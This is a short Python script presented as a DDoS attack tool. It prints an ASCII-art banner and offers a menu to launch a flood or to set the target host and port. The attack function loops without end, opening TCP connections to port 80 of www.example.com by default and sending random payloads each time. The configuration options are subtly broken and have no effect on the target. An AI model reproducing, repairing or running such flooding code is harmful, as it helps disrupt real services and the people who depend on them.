import socket
import random

ddos_boom = '''
 DDDDDDDDDDDD        DDDDDDDDDDD        OOOOOOOOO        SSSSSSSSSSSSSSS
D::::::::::::DDD   D::::::::::::DDD   OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD D:::::::::::::::DD O:::::::::::O  S:::::SSSSSS::::::S
DDD:::::DDDDD:::::DDD:::::DDDDD:::::DO:::::OOO:::::O S:::::S     SSSSSSS
  D:::::D    D:::::D D:::::D    D:::::DO::::O   O::::O S:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO::::O   O::::O  S::::SSSS         
  D:::::D     D:::::DD:::::D     D:::::DO::::O   O::::O   SS::::::SSSSS    
  D:::::D     D:::::DD:::::D     D:::::DO::::O   O::::O     SSS::::::::SS  
  D:::::D     D:::::DD:::::D     D:::::DO::::O   O::::O        SSSSSS::::S 
  D:::::D     D:::::DD:::::D     D:::::DO::::O   O::::O             S:::::S
  D:::::D    D:::::D D:::::D    D:::::DO:::::OOO:::::O SSSSSSS     S:::::S
DDD:::::DDDDD:::::DDD:::::DDDDD:::::DO:::::::::::O  S::::::SSSSSS:::::S
D:::::::::::::::DD D:::::::::::::::DD O:::::::::::O   S:::::::::::::::SS 
D::::::::::::DDD   D::::::::::::DDD   OO:::::::::OO     SSSSSSSSSSSSSSS   
DDDDDDDDDDDD        DDDDDDDDDDD        OOOOOOOOO           SSSSSSSSSSS

'''

print(ddos_boom)

target_ip = "www.example.com"
target_port = 80

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            packet = random._urandom(1024)
            s.send(packet)
            s.close()
            print("DDoS packet sent successfully!")
        except:
            print("Connection failed. Retrying...")

def main():
    print("DDoS Attack Options:")
    print("1. Launch DDoS attack")
    print("2. Configure target IP")
    print("3. Configure target port")
    print("4. Exit")

    while True:
        option = input("Enter your choice: ")

        if option == "1":
            ddos_attack()
        elif option == "2":
            target_ip = input("Enter the target IP: ")
            print("Target IP configured successfully!")
        elif option == "3":
            target_port = int(input("Enter the target port: "))
            print("Target port configured successfully!")
        elif option == "4":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
